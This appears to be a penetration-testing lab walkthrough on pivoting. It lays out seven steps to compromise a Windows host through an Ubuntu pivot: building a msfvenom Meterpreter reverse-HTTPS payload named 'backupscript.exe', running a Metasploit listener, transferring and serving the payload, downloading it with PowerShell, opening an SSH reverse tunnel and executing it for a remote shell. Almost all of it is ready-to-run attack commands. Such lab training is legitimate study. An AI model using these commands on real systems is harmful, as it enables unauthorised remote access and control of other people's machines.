# 🔁 FULL EXECUTION FLOW

---

## 🔹 STEP 1 — Create Payload

📍 **Run on: Attack Host**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

### ✅ What:

Creates Windows reverse shell

### ✅ Why:

- Windows **cannot reach you**
    
- So payload connects to **Ubuntu (pivot)**
    

---

## 🔹 STEP 2 — Start Listener

📍 **Run on: Attack Host**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

### ✅ What:

Starts listener on port 8000

### ✅ Why:

Final shell will reach here (via pivot)

---

## 🔹 STEP 3 — Transfer Payload

📍 **Run on: Attack Host**

```bash
scp backupscript.exe ubuntu@10.129.x.x:~/
```

### ✅ What:

Copy payload → Ubuntu

### ✅ Why:

Windows can access Ubuntu, not you

---

## 🔹 STEP 4 — Host File Server

📍 **Run on: Ubuntu (Pivot)**

```bash
python3 -m http.server 8123
```

### ✅ What:

Start web server

### ✅ Why:

Windows will download payload from here

---

## 🔹 STEP 5 — Download Payload

📍 **Run on: Windows (via RDP)**

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### ✅ What:

Downloads payload

### ✅ Why:

Windows needs payload locally to execute

---

## 🔹 STEP 6 — Create Reverse Tunnel (MOST IMPORTANT)

📍 **Run on: Attack Host**

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.x.x -vN
```

---

### ✅ What this does:

|Part|Meaning|
|---|---|
|`172.16.5.129:8080`|Ubuntu listens here|
|`0.0.0.0:8000`|Forward to your machine|

---

### 🔥 WHY:

- Windows → can connect to `172.16.5.129:8080`
    
- Ubuntu → forwards it → your machine:8000
    

---

## 🔹 STEP 7 — Execute Payload

📍 **Run on: Windows**

```powershell
C:\backupscript.exe
```

---

### ✅ What happens now:

```text
Windows → 172.16.5.129:8080
        ↓
Ubuntu receives
        ↓
SSH tunnel
        ↓
Attack Host:8000
        ↓
Meterpreter session
```
